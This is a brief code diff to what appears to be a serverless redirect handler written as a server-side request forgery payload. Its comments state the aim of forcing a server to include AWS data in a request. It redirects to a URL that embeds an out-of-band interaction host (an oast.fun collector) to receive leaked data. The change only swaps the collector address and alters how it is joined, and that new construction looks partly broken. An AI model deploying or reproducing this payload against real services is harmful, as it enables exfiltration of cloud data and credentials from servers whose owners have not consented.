@@ -5,7 +5,7 @@ export default {
     const awsUrl = "https://api.ipify.org";
     
     // Step 2: Force the server to include AWS data in the URL path/params
-    const interactshUrl = "https://bjgibppjensgmxvguqwd06y62oihj7mtd.oast.fun/leak?url=";
-    return Response.redirect(`${awsUrl}?redirect=${encodeURIComponent(interactshUrl)}`, 302);
+    const interactshUrl = "https://bjgibppjensgmxvguqwdm2xp3ddbjdtag.oast.fun";
+    return Response.redirect(`${awsUrl}.${encodeURIComponent(interactshUrl)}`, 302);
   }
 };
